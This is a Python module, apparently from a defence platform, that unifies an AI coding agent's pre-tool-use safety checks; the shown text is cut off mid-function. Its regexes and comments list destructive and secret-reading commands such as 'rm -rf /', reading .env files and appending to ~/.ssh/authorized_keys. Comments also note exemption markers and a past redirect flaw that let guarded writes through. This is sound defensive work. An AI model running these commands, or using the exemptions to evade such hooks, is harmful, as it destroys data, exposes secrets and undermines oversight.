# [TEMPLATE: CUI // SP-CTI]
"""One implementation of every pre-tool-use safety check.

Why this module exists
----------------------
``.claude/hooks/pre_tool_use.py`` ran EIGHT blocking checks; the function every
non-Claude-Code orchestrator actually calls —
``tools/airgap/hook_compat.run_pre_tool_check`` — implemented TWO, plus one the
Claude path did not have (the destructive-git blocklist). Neither path was a
superset of the other, so an agent running OUTSIDE Claude Code was materially
LESS guarded than one running inside it. For an IL5/IL6 platform that is exactly
backwards.

Every check lives here now, as a pure function over ``(tool_name, tool_input)``
returning ``Optional[str]`` — the block reason, or ``None`` to allow. Both hook
paths import from this module, so the two cannot drift again.

Scope note (hgx-guard-01): this module is the EXTRACTION. It deliberately does
not change what either caller blocks — the Claude Code hook still runs its eight
checks and the headless path still runs its two. Wiring all eight into the
headless path is hgx-guard-02.

Conventions this module holds itself to
---------------------------------------
* **Never ``os.getcwd()``.** These checks run from git worktrees, where cwd is
  the worktree root rather than the repo root — precisely the hazard CLAUDE.md
  documents. The repo root is resolved from ``__file__`` (see
  :func:`default_repo_root`) or passed in explicitly by the caller.
* **No shell.** Subprocesses are list-argv with ``shell=False`` (the default).
* **OS-agnostic.** ``pathlib`` for paths, ``encoding="utf-8"`` on every read,
  and explicit two-sided platform branches where POSIX and Windows genuinely
  differ (see :func:`worktree_add_target`).
* **Fail open on a broken guard, never on a matched rule.** A guard that cannot
  resolve a path must not be the reason a session cannot work; a guard that DID
  match must always block.
"""

from __future__ import annotations

import os
import re
import shlex
import subprocess
import sys
from fnmatch import fnmatch
from pathlib import Path
from typing import Callable, Dict, List, Optional, Sequence, Tuple

__all__ = [
    "default_repo_root",
    # 0 — shell-aware scanning, shared by every Bash-shaped check
    "command_segments",
    "strip_heredoc_data",
    "command_word",
    "shell_tokens",
    # 1 — .env access
    "is_env_file_access",
    "check_env_file_access",
    "ENV_FILE_BLOCK_REASON",
    # 2 — dangerous rm
    "is_dangerous_rm_command",
    "check_dangerous_rm",
    "DANGEROUS_RM_BLOCK_REASON",
    # 3 — append-only tables
    "is_append_only_table_modification",
    "check_append_only_write",
    "find_append_only_table",
    "APPEND_ONLY_BLOCK_REASON",
    # 4 — direct sqlite3.connect()
    "is_direct_sqlite_usage",
    "check_direct_sqlite_usage",
    "DIRECT_SQLITE_BLOCK_REASON",
    # 5 — D-ORCH-8 file access tiers
    "check_file_access_tiers",
    "bash_file_targets",
    # 6 — unmerged remote-branch deletion
    "check_branch_deletion",
    "remote_branch_delete_targets",
    # 7 — worktree path enforcement
    "check_worktree_path",
    "worktree_add_target",
    # 8 — review-loop pre-commit
    "check_review_loop_precommit",
    # 9 — destructive git blocklist (both paths since exa-bench-06)
    "GIT_DANGER_PATTERNS",
    "git_danger_reason",
    "check_git_danger",
    # 10 — AGOV declarative agent rules, monitor-only by default (agov-det-06)
    "check_agent_rules",
    "reset_agent_gate",
    # 11 — network egress, monitor-only by default (exa-bench-08)
    "check_network_egress",
    "egress_destinations",
    "reset_egress_policy",
]


# ── Repo root ─────────────────────────────────────────────────────────────
#
# rls-bypass: repo root is resolved from __file__ and never from os.getcwd() —
# required for hgx-guard-01 because these checks run from git worktrees, where
# cwd is the worktree root and not the repository the rules are written against.

_REPO_ROOT_MARKERS = ("args", "tools", "goals")


def default_repo_root() -> Path:
    """Repository root, resolved from this file's location.

    Walks up from ``__file__`` until it finds a directory carrying the ICDEV
    top-level layout. Falls back to ``parents[2]`` (``tools/hooks/x.py`` ->
    repo root), which is also the right answer for the ``icdev/`` mirror when
    the marker walk finds the packaged root first.

    Callers that already know their root (the Claude Code hook, hook_compat)
    should pass it explicitly rather than rely on this.
    """
    here = Path(__file__).resolve()
    for candidate in here.parents:
        if all((candidate / marker).is_dir() for marker in _REPO_ROOT_MARKERS):
            return candidate
    return here.parents[2]


def _resolve_root(repo_root: Optional[Path]) -> Path:
    return Path(repo_root) if repo_root is not None else default_repo_root()


def _off(name: str) -> bool:
    """True when an on-by-default toggle has been explicitly switched off."""
    return os.environ.get(name, "1").strip().lower() in ("0", "false", "no", "off")


def _on(name: str) -> bool:
    """True when an off-by-default toggle has been explicitly switched on."""
    return os.environ.get(name, "").strip().lower() in ("1", "true", "yes", "on")


# ── 0. Shell-aware scanning ───────────────────────────────────────────────
#
# Every Bash-shaped check below used to match against the WHOLE raw command
# string. Measured over 86,475 real tool calls (exa-bench-05, see
# ``tools/hooks/fire_rate_survey.py``) that is the single largest source of
# false refusals, in two distinct shapes:
#
#   1. **Heredoc and quoted bodies scanned as if they were commands.** A PR body
#      that quotes ``DELETE FROM audit_trail``, a commit message describing a
#      ``.env`` fix, a grep pattern searching for the very thing being guarded —
#      all read as the guarded action itself.
#   2. **Cross-segment attribution.** ``rm -f x.json; grep -rln foo tests/``
#      contains ``rm``, and later, ``-r``. The old ``\brm\s+.*-[a-z]*r`` spans
#      the ``;`` and reads the grep's flag as the rm's, so a targeted delete of
#      one file scored as a recursive wipe.
#
# Both are fixed once, here, rather than nine times. Splitting a command into
# segments can only ever make each haystack SMALLER, so it cannot introduce a
# false negative for a single-command pattern; the splitter is quote-aware so a
# separator inside ``psql -c "... WHERE a|b"`` does not cut the statement in two.

_HEREDOC_OPEN_RE = re.compile(r"<<-?\s*(['\"]?)([A-Za-z_][A-Za-z0-9_]*)\1")

#: A heredoc fed to one of these IS the program being run, so its body is code
#: and must still be scanned. Fed to anything else (``cat > f``, ``git commit
#: -F -``, ``gh pr create --body "$(cat <<EOF``) it is data.
_INTERPRETER_RE = re.compile(
    r"(?<![\w./-])(?:python[23]?|py|sh|bash|zsh|ksh|node|perl|ruby|psql|sqlite3|mysql)\b"
)

#: Command words that print or search text and cannot themselves perform the
#: guarded action: a match inside their arguments is a pattern or a message.
#: ``echo '{"command":"rm -rf /"}' | python hook.py`` — the corpus's own way of
#: testing this very hook — is an ``echo``, not a delete.
_PROSE_COMMAND_WORDS = frozenset({
    "grep", "egrep", "fgrep", "rg", "ag", "ack", "findstr", "select-string",
    "cat", "less", "more", "head", "tail", "wc", "diff", "ls", "echo", "printf",
    "gh", "glab", "code",
})

#: Adds ``git`` for the SQL checks only. A commit message or PR body quoting
#: ``DELETE FROM audit_trail`` executes nothing — but ``git rm -rf`` deletes, so
#: ``git`` must NOT be excused from :func:`is_dangerous_rm_command`.
_READ_ONLY_COMMAND_WORDS = _PROSE_COMMAND_WORDS | {"git"}

_COMMAND_WORD_RE = re.compile(
    r"^\s*(?:[A-Za-z_][A-Za-z0-9_]*=\S*\s+)*"      # leading VAR=value assignments
    r"(?:(?:sudo|command|exec|time|env|nohup)\s+)*"  # transparent prefixes
    r"([^\s;|&<>()]+)"
)


def strip_heredoc_data(command: str) -> str:
    """Drop heredoc bodies that are DATA, keep the ones that are CODE.

    The opener line decides: ``python - <<'PY'`` runs its body, so the body is
    kept; ``cat > notes.md <<'EOF'`` and ``git commit -F - <<'EOF'`` do not, so
    theirs is dropped. An unterminated heredoc (a truncated transcript, a
    still-open command) drops to end-of-string rather than raising.
    """
    if "<<" not in command:
        return command
    lines = command.splitlines()
    out: List[str] = []
    i = 0
    while i < len(lines):
        line = lines[i]
        out.append(line)
        i += 1
        match = _HEREDOC_OPEN_RE.search(line)
        if not match:
            continue
        terminator = match.group(2)
        end = i
        while end < len(lines) and lines[end].strip() != terminator:
            end += 1
        if _INTERPRETER_RE.search(line):
            out.extend(lines[i:end])
        if end < len(lines):
            out.append(lines[end])
        i = end + 1
    return "\n".join(out)


def command_segments(command: str) -> List[str]:
    """Split *command* into individually-executed segments, quote-aware.

    Splits on ``&&``, ``||``, ``;``, ``|`` and newlines that are not inside a
    quoted string, after :func:`strip_heredoc_data`. Returns ``[]`` for a
    command that is entirely whitespace.
    """
    text = strip_heredoc_data(command or "")
    segments: List[str] = []
    buf: List[str] = []
    quote: Optional[str] = None
    i = 0
    length = len(text)
    while i < length:
        ch = text[i]
        if quote is not None:
            buf.append(ch)
            if ch == "\\" and quote == '"' and i + 1 < length:
                buf.append(text[i + 1])
                i += 2
                continue
            if ch == quote:
                quote = None
            i += 1
            continue
        if ch in "'\"":
            quote = ch
            buf.append(ch)
            i += 1
            continue
        if ch == "\\" and i + 1 < length:
            buf.append(ch)
            buf.append(text[i + 1])
            i += 2
            continue
        if text[i:i + 2] in ("&&", "||"):
            segments.append("".join(buf))
            buf = []
            i += 2
            continue
        if ch in ";|\n&":
            segments.append("".join(buf))
            buf = []
            i += 1
            continue
        buf.append(ch)
        i += 1
    segments.append("".join(buf))
    return [s.strip() for s in segments if s.strip()]


def command_word(segment: str) -> str:
    """Lowercased basename of the program a segment invokes, or ``""``.

    ``VAR=1 sudo /usr/bin/grep -r x`` -> ``grep``.
    """
    match = _COMMAND_WORD_RE.match(segment or "")
    if not match:
        return ""
    token = match.group(1).strip("\"'")
    return os.path.basename(token.replace("\\", "/")).lower()


def _is_read_only_segment(segment: str) -> bool:
    """True when the segment's program cannot perform the guarded action."""
    return command_word(segment) in _READ_ONLY_COMMAND_WORDS


# ── 1. .env file access ───────────────────────────────────────────────────

ENV_FILE_BLOCK_REASON = (
    "BLOCKED: Access to .env files is prohibited. Use AWS Secrets Manager."
)

#: Suffixes that mark a checked-in TEMPLATE rather than a secrets file. Mirrors
#: the ``!.env.sample`` / ``!.env.example`` exclusions already declared in
#: ``args/file_access_tiers.yaml`` — the two must agree, or this check refuses
#: what D-ORCH-8 explicitly permits (measured: 24 of 70 refusals).
_ENV_TEMPLATE_SUFFIXES = (".sample", ".example", ".template", ".dist", ".tpl")

#: `C:\x\.env` and `\\host\share\.env` are paths; `^\.env` is a regex.
_WINDOWS_PATH_RE = re.compile(r"^(?:[A-Za-z]:[\\/]|\\\\)")


def _is_env_template(file_path: str) -> bool:
    name = os.path.basename(file_path.replace("\\", "/")).lower()
    return name.endswith(_ENV_TEMPLATE_SUFFIXES)


def shell_tokens(segment: str) -> List[str]:
    """Best-effort argv of one shell segment. Never raises.

    Falls back to a whitespace split when the segment does not lex — a
    half-quoted fragment must still be scannable, just less precisely.
    """
    try:
        tokens = shlex.split(segment, posix=(os.name != "nt"))
    except ValueError:
        tokens = segment.split()
    return [
        t[1:-1] if len(t) > 1 and t[0] == t[-1] and t[0] in "\"'" else t
        for t in tokens
    ]


def _is_env_path_operand(token: str) -> bool:
    """True when *token* IS the ``.env`` file, rather than mentions it.

    ``.env`` and ``$WT/.env`` are the file. ``process.env``, the regex literal
    ``\\.env``, ``.env.example`` and a ``--body`` describing a ``.env`` change
    are not, and each of those refused before this (measured, exa-bench-05).
    """
    t = token.strip("\"'").lstrip("><&")
    if t == ".env":
        return True
    # A parent directory is required, so the bare escaped `\.env` of a grep
    # pattern is not a path.
    if t.endswith("/.env") and len(t) > 5:
        return True
    # A backslash is a path separator only in something already shaped like a
    # Windows path. Otherwise `grep -n "^\.env" .gitignore` reads as one.
    if t.endswith("\\.env") and _WINDOWS_PATH_RE.match(t):
        return True
    return False


#: Programs that put a file's CONTENTS somewhere — on screen, in another file,
#: or into the shell. This is the original check's vocabulary (``cat …​ .env``
#: and ``echo …​ > .env``) made precise, not widened. ``ls``, ``git
#: check-ignore`` and ``grep`` are deliberately absent: they were never blocked,
#: they reveal nothing a directory listing does not, and inspecting which
#: backend `.env` selects is routine work in this repo. Deletion of `.env` is
#: not this check's business either — ``check_file_access_tiers`` governs it
#: through the ``zero_access`` tier, with the exclusions D-ORCH-8 declares.
#:
#: ``source``/``.`` are absent for the same reason ``cp`` is: ``set -a && .
#: ./.env`` is how CLAUDE.md tells a session to load platform configuration
#: before running the kanban CLI. It puts nothing on screen.
_ENV_CONTENT_COMMANDS = frozenset({
    "cat", "less", "more", "bat", "head", "tail", "strings", "base64", "xxd",
    "od", "tee",
})

_REDIRECT_TOKEN_RE = re.compile(r"^\d*>{1,2}$")


def _bash_reads_env_file(segment: str) -> bool:
    tokens = shell_tokens(segment)
    if not tokens:
        return False
    env_operands = [i for i, t in enumerate(tokens) if _is_env_path_operand(t)]
    if not env_operands:
        return False
    if command_word(segment) in _ENV_CONTENT_COMMANDS:
        return True
    # `> .env`, `>> .env`, `2> .env`, and the unspaced `>.env` (whose redirect
    # chars _is_env_path_operand already strips).
    for i in env_operands:
        if tokens[i].lstrip("><&") != tokens[i]:
            return True
        if i and _REDIRECT_TOKEN_RE.match(tokens[i - 1]):
            return True
    return False


def is_env_file_access(tool_name: str, tool_input: dict) -> bool:
    """Check if a tool is trying to access .env files.

    The Bash arm requires a ``.env`` **path operand** of a content-reading or
    file-writing command, not the substring anywhere in the line. ICDEV's own
    documented idiom is ``python -c "from dotenv import load_dotenv;
    load_dotenv('.env')"`` — CLAUDE.md tells admins to configure the platform in
    ``.env`` — and that reaches the shell as a single ``python -c`` argument,
    not as a file the command opens.
    """
    if tool_name in ("Read", "Edit", "MultiEdit", "Write"):
        file_path = tool_input.get("file_path", "")
        if ".env" in file_path and not _is_env_template(file_path):
            return True

    elif tool_name == "Bash":
        return any(
            _bash_reads_env_file(seg)
            for seg in command_segments(tool_input.get("command", ""))
        )

    return False


def check_env_file_access(tool_name: str, tool_input: dict) -> Optional[str]:
    """Block reason when the call reads or writes a secrets-bearing .env file."""
    return ENV_FILE_BLOCK_REASON if is_env_file_access(tool_name, tool_input) else None


# ── 2. Dangerous rm ───────────────────────────────────────────────────────

DANGEROUS_RM_BLOCK_REASON = "BLOCKED: Dangerous rm command detected and prevented"

#: ``rm`` as a program name, not as the tail of a flag.
#:
#: ``\brm`` matches inside ``docker run --rm`` — ``-`` is a non-word character,
#: so ``\b`` sits right before the ``r``. Every ``docker run --rm`` in the corpus
#: therefore scored as a dangerous delete (measured: the largest single class of
#: this check's 494 refusals). ``/bin/rm`` and ``git rm`` are still matched;
#: ``--rm``, ``--rmdir`` and ``xyz-rm`` are not.
_RM_WORD = r"(?<![-\w.])rm\b"

_RM_FLAG_PATTERNS = tuple(
    re.compile(p) for p in (
        rf"{_RM_WORD}\s+.*-[a-z]*r[a-z]*f",
        rf"{_RM_WORD}\s+.*-[a-z]*f[a-z]*r",
        rf"{_RM_WORD}\s+--recursive\s+--force",
        rf"{_RM_WORD}\s+--force\s+--recursive",
        rf"{_RM_WORD}\s+-r\s+.*-f",
        rf"{_RM_WORD}\s+-f\s+.*-r",
    )
)

_RM_RECURSIVE_RE = re.compile(rf"{_RM_WORD}\s+.*-[a-z]*r")

#: Targets whose recursive deletion is unrecoverable or catastrophic.
#:
#: These used to be substring patterns — ``/``, ``.``, ``*`` — searched across
#: the WHOLE command, which made every possible target dangerous: any path has a
#: separator, any filename has a dot. Combined with the flag patterns, that made
#: the rule "no ``rm -rf``, ever", and a rule that refuses 288 scratch-directory
#: cleanups in 30 days is a rule that has to be left switched off. What makes
#: ``rm -rf`` dangerous is the TARGET, so the target is what is matched — as a
#: whole token now, not as a substring.
_RM_WIDE_TARGETS = frozenset({
    "", "-", "/", "/*", "~", "~/", "~/*", ".", "./", "./*", ".*",
    "..", "../", "../*", "*", "$home", "$home/", "$home/*",
    # A repository's history is the one thing inside a checkout that `git`
    # cannot restore, so it is wide even though it is a relative path.
    ".git", ".git/", ".git/*",
})


def _rm_targets(segment: str) -> List[str]:
    """Positional operands of the ``rm`` in *segment*, flags removed."""
    tokens = shell_tokens(segment)
    for i, tok in enumerate(tokens):
        if os.path.basename(tok.replace("\\", "/")).lower() == "rm":
            return [t for t in tokens[i + 1:] if not t.startswith("-")]
    return []


def _is_wide_rm_target(target: str) -> bool:
    """True when deleting *target* recursively is unrecoverable or catastrophic."""
    t = target.strip("\"'").replace("\\", "/").lower().rstrip()
    if t in _RM_WIDE_TARGETS:
        return True
    if t.startswith("~") or t.startswith("$home"):
        return True
    if t.endswith("/.git") or t.endswith("/.git/"):
        return True
    parts = [p for p in t.split("/") if p not in ("", ".")]
    if ".." in parts:
        return True
    if t.startswith("/"):
        # /etc, /usr, /home — a top-level system directory. /home/u/proj/build
        # is a specific path and not this check's business.
        return len(parts) <= 1
    if re.match(r"^[a-z]:(/|$)", t):
        return len(parts) <= 2   # c:, c:/, c:/users
    return False


def _is_dangerous_rm_segment(segment: str) -> bool:
    if command_word(segment) in _PROSE_COMMAND_WORDS:
        return False

    normalized = " ".join(segment.lower().split())
    recursive_force = any(p.search(normalized) for p in _RM_FLAG_PATTERNS)
    recursive = recursive_force or bool(_RM_RECURSIVE_RE.search(normalized))
    if not recursive:
        return False

    targets = _rm_targets(segment)
    if not targets:
        # A recursive rm whose target this parser cannot see is not a scoped
        # delete as far as anything here can tell. Fail closed.
        return True
    return any(_is_wide_rm_target(t) for t in targets)


def is_dangerous_rm_command(command: str) -> bool:
    """Detect dangerous rm commands.

    Two changes from the flag-only form, both measured over 86,612 real tool
    calls (exa-bench-05):

    * **Per shell segment.** The flags of a LATER command are not the flags of
      an earlier ``rm``. ``rm -f a.json; grep -rln foo tests/`` deletes exactly
      one file, and refused because the grep's ``-r`` completed the ``rm``'s
      pattern across the ``;``.
    * **Scoped by target.** ``rm -rf /`` and ``rm -rf .tmp/probe`` differ in
      what they destroy, not in how they are spelled. See
      :data:`_RM_WIDE_TARGETS`.
    """
    return any(_is_dangerous_rm_segment(seg) for seg in command_segments(command))


def check_dangerous_rm(tool_name: str, tool_input: dict) -> Optional[str]:
    """Block reason for a recursive/forced ``rm``. Bash calls only."""
    if tool_name != "Bash":
        return None
    if is_dangerous_rm_command(tool_input.get("command", "")):
        return DANGEROUS_RM_BLOCK_REASON
    return None


# ── 3. Append-only table writes (D6, NIST 800-53 AU) ──────────────────────
#
# The canonical table list deliberately stays in
# ``.claude/hooks/pre_tool_use.py``: CLAUDE.md's guardrail, the child-app
# generator's per-schema filter (``_adapt_pre_tool_use_for_child``),
# ``coherence_checker``'s autofix and half a dozen tests all read it there.
# The LOGIC is what was duplicated, so the LOGIC is what moved here — the
# caller passes its own list. hgx-guard-02 reconciles the two lists.

APPEND_ONLY_BLOCK_REASON = (
    "BLOCKED: Append-only table (D6, NIST 800-53 AU). "
    "No UPDATE/DELETE/DROP/TRUNCATE allowed."
)

# Cheap pre-guard. Every protected-table pattern requires one of these verbs,
# so a command containing none of them cannot match and we skip the (much
# larger) alternation entirely. The overwhelming majority of Bash calls are not
# SQL at all, and this hook is on the critical path of every single tool call.
_SQL_MUTATION_VERB_RE = re.compile(r"\b(?:update|delete|drop|truncate)\b")

#: Markers that a segment has deliberately pointed the storage layer at a
#: disposable database.
#:
#: This guard protects the PLATFORM's audit tables. Every remaining refusal in
#: the corpus was a security test building its own chain in a tempdir and then
#: tampering with it to prove detection works — exa-audit-03 and exa-audit-04
#: could not have been written with this enforcing. It is a mistake-preventer,
#: not an attacker-resistant control (it string-matches a command the agent
#: composed itself), so an explicit "this is a scratch DB" marker is a
#: legitimate thing for it to believe. The real per-call authority over an
#: irreversible action is ``tools/agent_runtime/approval_gate.py``.
_THROWAWAY_DB_MARKERS = (":memory:", "tempfile", "icdev_db_path=", "mkdtemp")


def _targets_throwaway_db(segment: str) -> bool:
    lowered = segment.lower()
    return any(marker in lowered for marker in _THROWAWAY_DB_MARKERS)

# Compiled once per distinct table list, then reused. One alternation per SQL
# shape instead of three regexes per table: with 350+ tables the naive form
# compiled ~1000 patterns per call, blowing re's 512-entry cache every time so
# nothing was ever reused. Keyed by the table tuple because two callers pass
# two different lists in the same process.
_APPEND_ONLY_PATTERN_CACHE: Dict[Tuple[str, ...], Tuple[re.Pattern, ...]] = {}


def _append_only_patterns(tables: Sequence[str]) -> Tuple[re.Pattern, ...]:
    """Compile (and memoize) the protected-table patterns for *tables*.

    Matching is equivalent to the per-table form: True if ANY table matches ANY
    shape.
    """
    key = tuple(tables)
    cached = _APPEND_ONLY_PATTERN_CACHE.get(key)
    if cached is not None:
        return cached
    # De-duplicated (source lists have a few repeats) and longest-first so the
    # alternation prefers the most specific table name.
    alt = "|".join(re.escape(t) for t in sorted(set(tables), key=lambda t: (-len(t), t)))
    compiled = (
        re.compile(rf"(?:update|delete)\s+(?:from\s+)?(?:{alt})"),
        re.compile(rf"drop\s+table\s+.*(?:{alt})"),
        re.compile(rf"truncate\s+.*(?:{alt})"),
    )
    _APPEND_ONLY_PATTERN_CACHE[key] = compiled
    return compiled


def is_append_only_table_modification(
    tool_name: str, tool_input: dict, tables: Sequence[str]
) -> bool:
    """Block UPDATE/DELETE/DROP/TRUNCATE on any table in *tables*.

    *tables* must stay in sync with ``init_icdev_db.py``. Run the governance
    validator to detect drift:
    ``python tools/testing/claude_dir_validator.py --json``
    """
    if tool_name != "Bash":
        return False

    command = tool_input.get("command", "") or ""
    # Cheap pre-guard on the whole string before any segmentation work.
    if not _SQL_MUTATION_VERB_RE.search(command.lower()):
        return False

    # Whole-command, not per segment: `export ICDEV_DB_PATH=<tmp>` and the
    # python that uses it are two segments of one line.
    if _targets_throwaway_db(command):
        return False

    patterns = _append_only_patterns(tables)
    for segment in command_segments(command):
        # `grep -n "DELETE FROM audit_trail" tests/` searches FOR the guarded
        # statement; `gh pr create --title "... UPDATE audit_trail ..."` writes
        # prose about it. Neither executes SQL, and both refused before this.
        if _is_read_only_segment(segment):
            continue
        lowered = segment.lower()
        for pattern in patterns:
            if pattern.search(lowered):
                return True

    return False


def check_append_only_write(
    tool_name: str, tool_input: dict, tables: Sequence[str]
) -> Optional[str]:
    """Block reason for a destructive write to an append-only table."""
    if is_append_only_table_modification(tool_name, tool_input, tables):
        return APPEND_ONLY_BLOCK_REASON
    return None


def find_append_only_table(command: str, tables: Sequence[str]) -> Optional[str]:
    """First table in *tables* the command would UPDATE or DELETE, else None.

    The narrower shape the headless path has always used: UPDATE/DELETE only
    (no DROP/TRUNCATE), and it names the offending table so the caller can put
    it in the refusal. Case-insensitive.
    """
    lowered = command.lower()
    for table in tables:
        if re.search(rf"(update|delete)\s+(from\s+)?{re.escape(table)}", lowered):
            return table
    return None


# ── 4. Direct sqlite3.connect() ───────────────────────────────────────────

DIRECT_SQLITE_BLOCK_REASON = (
    "BLOCKED: Direct sqlite3.connect() bypasses the storage layer. "
    "Production backend is PostgreSQL. Use: from tools.db.storage import get_connection; "
    "conn = get_connection(). See MEMORY: feedback_always_use_get_connection.md"
)

# Files that legitimately need raw sqlite3.
_SQLITE_EXEMPT_PATTERNS = (
    # The storage layer's own package. Seven files here were listed one by one;
    # every module added to it since (`shadowed_migration_replay.py`, …) needs
    # the same exemption for the same reason, and enumerating them one refusal
    # at a time is how the list fell behind.
    "tools/db/",
    "tools/compat/db_utils.py",       # path resolution utilities
    "tools/saas/",                    # tenant-isolated DBs (separate SQLite per tenant)
    "tools/hooks/",                   # IS this check — its source names the pattern
)

#: Source extensions this check applies to. It exists to stop a raw
#: ``sqlite3.connect()`` from being INTRODUCED, and only an importable module
#: can introduce one. Documenting the pattern is not committing it: the old
#: content-substring test refused `tools/manifest/safety-hooks.md`, which is the
#: manifest row FOR this check, and the very file that implements it.
_SQLITE_SOURCE_SUFFIXES = (".py", ".pyi")

#: A one-liner that WRITES through a raw sqlite3 handle. See the Bash arm.
_SQLITE_WRITE_RE = re.compile(
    r"\b(?:insert\s+into|update\s+\w|delete\s+from|drop\s+table|create\s+table"
    r"|alter\s+table|truncate|replace\s+into|\.commit\(|executemany\()",
    re.IGNORECASE,
)


def is_direct_sqlite_usage(tool_name: str, tool_input: dict) -> bool:
    """Block direct sqlite3.connect() usage that bypasses the storage layer.

    Production backend is PostgreSQL. Writing to sqlite3 directly means the
    data is invisible to the dashboard and API. This has caused repeated
    confusion — data written to SQLite never appears in the UI.

    ALWAYS use: ``from tools.db.storage import get_connection``.
    ``*/init_db.py`` is allowed (child app / canvas isolated DB init).
    """
    if tool_name in ("Edit", "Write"):
        file_path = tool_input.get("file_path", "").replace("\\", "/")
        new_content = tool_input.get("new_string", "") or tool_input.get("content", "")

        # Only check files under tools/ (handle both absolute and relative paths)
        if "/tools/" not in file_path and not file_path.startswith("tools/"):
            return False

        if not file_path.lower().endswith(_SQLITE_SOURCE_SUFFIXES):
            return False

        for exempt in _SQLITE_EXEMPT_PATTERNS:
            if exempt in file_path:
                return False

        # Allow init_db.py files (canvas/child app isolated DBs)
        if file_path.endswith("/init_db.py"):
            return False

        if "sqlite3.connect(" in new_content:
            return True

    elif tool_name == "Bash":
        # Per segment, so the two substrings have to appear in the SAME command
        # rather than anywhere in a compound line.
        for segment in command_segments(tool_input.get("command", "")):
            if "sqlite3.connect" not in segment or "icdev.db" not in segment:
                continue
            # Allow if it's running a migration or init script
            if any(x in segment for x in
                   ["init_icdev_db", "migration_runner", "migrate_to_storage", "backup"]):
                continue
            if not _SQLITE_WRITE_RE.search(segment):
                # The stated harm is "data written to SQLite never appears in
                # the UI" (the storage layer routes to PostgreSQL). A read does
                # not write anything anywhere, and read-only diagnostics were
                # the bulk of this check's refusals.
                continue
            return True

    return False


def check_direct_sqlite_usage(tool_name: str, tool_input: dict) -> Optional[str]:
    """Block reason when a call introduces a raw ``sqlite3.connect()``."""
    if is_direct_sqlite_usage(tool_name, tool_input):
        return DIRECT_SQLITE_BLOCK_REASON
    return None


# ── 5. Tiered file access control (D-ORCH-8) ──────────────────────────────

_FILE_ACCESS_TIERS_CACHE: Dict[str, Optional[dict]] = {}

_RM_TARGET_RE = re.compile(r"\brm\s+(?:-[a-z]*\s+)*([^\s|;&]+)")

#: Write redirections, and the target each one writes to.
#:
#: The previous pattern was ``>\s*([^\s|;&]+)``, which read an APPEND redirect
#: wrong in a way that silently defeated the tiers: against
#: ``echo k >> ~/.ssh/authorized_keys`` the first ``>`` matched, ``\s*`` matched
#: nothing, and the capture group took the SECOND ``>``. ``file_path`` became the
#: literal string ``">"``, which matches no tier pattern, so the append was
#: ALLOWED — while the single-``>`` form of the same command was blocked.
#:
#: So the operator is now matched as a unit. ``(?<!>)`` starts the match at the
#: FIRST ``>`` of a pair and ``>{1,2}`` consumes both, which is what the old
#: pattern got wrong. Nothing needs to be said about the fd prefix — ``1>>``,
#: ``2>>`` and ``&>>`` all just leave their prefix before the operator, so they
#: are handled by the same two tokens, with or without a space before the path.
#: ``(?!&)`` keeps fd duplication (``2>&1``) from reading as a write to a file
#: named ``1``, and excluding ``>`` from the capture class stops a stray
#: operator character being returned as a path again.
_REDIRECT_TARGET_RE = re.compile(r"(?<!>)>{1,2}\s*(?!&)([^\s|;&>]+)")

#: ``tee`` writes its target without any redirection operator at all, so the
#: pattern above cannot see it. ``-a`` (append) and friends are skipped the same
#: way ``_RM_TARGET_RE`` skips ``rm``'s flags.
_TEE_TARGET_RE = re.compile(r"\btee\s+(?:-[a-zA-Z]+\s+)*([^\s|;&>]+)")


def bash_file_targets(command: str) -> List[Tuple[str, bool, bool]]:
    """Every path a Bash command writes to or deletes, as ``(path, write, delete)``.

    Returns ALL of them rather than the first. A command redirects to more than
    one file often enough (``a > log 2>> err``) that stopping at the first match
    left the rest unexamined, and the tier check has to see each one to refuse
    the call.
    """
    targets: List[Tuple[str, bool, bool]] = []
    for match in _RM_TARGET_RE.finditer(command):
        targets.append((match.group(1), False, True))
    for match in _REDIRECT_TARGET_RE.finditer(command):
        targets.append((match.group(1), True, False))
    for match in _TEE_TARGET_RE.finditer(command):
        targets.append((match.group(1), True, False))
    return targets


def _read_file_access_tiers(root: Path) -> Optional[dict]:
    """Uncached read of the tier config. Returns None when absent or disabled."""
    try:
        import yaml
    except ImportError:
        return None
    config_path = root / "args" / "file_access_tiers.yaml"
    if not config_path.exists():
        return None
    try:
        config = yaml.safe_load(config_path.read_text(encoding="utf-8"))
        tiers = (config or {}).get("file_access_tiers", {})
        if not tiers.get("enabled", False):
            return None
        return tiers
    except Exception:
        return None


def _load_file_access_tiers(root: Path) -> Optional[dict]:
    """Memoized per repo root.

    Called for every tool call; re-parsing the YAML each time bought nothing
    because the hook is a short-lived process, so the config cannot change
    underneath a single invocation.
    """
    key = str(root)
    if key in _FILE_ACCESS_TIERS_CACHE:
        return _FILE_ACCESS_TIERS_CACHE[key]
    tiers = _read_file_access_tiers(root)
    _FILE_ACCESS_TIERS_CACHE[key] = tiers
    return tiers


def _matches_tier(file_path: str, patterns: List[str]) -> bool:
    """Check if file_path matches any pattern in the tier (glob-style)."""
    if not file_path:
        return False
    # Normalize to forward slashes and strip leading ./
    fp = file_path.replace("\\", "/")
    if fp.startswith("./"):
        fp = fp[2:]
    # os.path.basename, not PurePosixPath(fp).name: fp is already
    # forward-slashed, and the two disagree on a trailing separator.
    base = os.path.basename(fp)

    # Exclusions are matched against the SAME two candidates as inclusions.
    # They used to be full-path only while inclusions also tried the basename,
    # so `.env.*` caught `C:/wt/repo/.env.example` on its basename and
    # `!.env.example` — an absolute path against a bare pattern — never fired.
    # Every `.env.example` read and edit in the corpus refused on a tier that
    # explicitly exempts it (measured: 24 refusals, exa-bench-05).
    for exc in patterns:
        if exc.startswith("!") and (fnmatch(fp, exc[1:]) or fnmatch(base, exc[1:])):
            return False

    for pattern in patterns:
        if pattern.startswith("!"):
            continue  # exclusion patterns handled above
        if fnmatch(fp, pattern) or fnmatch(base, pattern):
            return True
    return False


def check_file_access_tiers(
    tool_name: str, tool_input: dict, repo_root: Optional[Path] = None
) -> Optional[str]:
    """Check file access tiers. Returns a block reason, or None if allowed.

    Decision D-ORCH-8: Tiered file access control.
    """
    tiers = _load_file_access_tiers(_resolve_root(repo_root))
    if not tiers:
        return None

    # (path, is_write, is_delete) — a Bash command can name more than one.
    targets: List[Tuple[str, bool, bool]] = []

    if tool_name in ("Read",):
        # Read — only blocked by zero_access
        targets.append((tool_input.get("file_path", ""), False, False))
    elif tool_name in ("Edit", "Write", "MultiEdit", "NotebookEdit"):
        targets.append(
            (tool_input.get("file_path", tool_input.get("notebook_path", "")), True, False)
        )
    elif tool_name == "Bash":
        # Segment first, then take EVERY target within each segment. Both halves
        # are load-bearing and neither subsumes the other:
        #
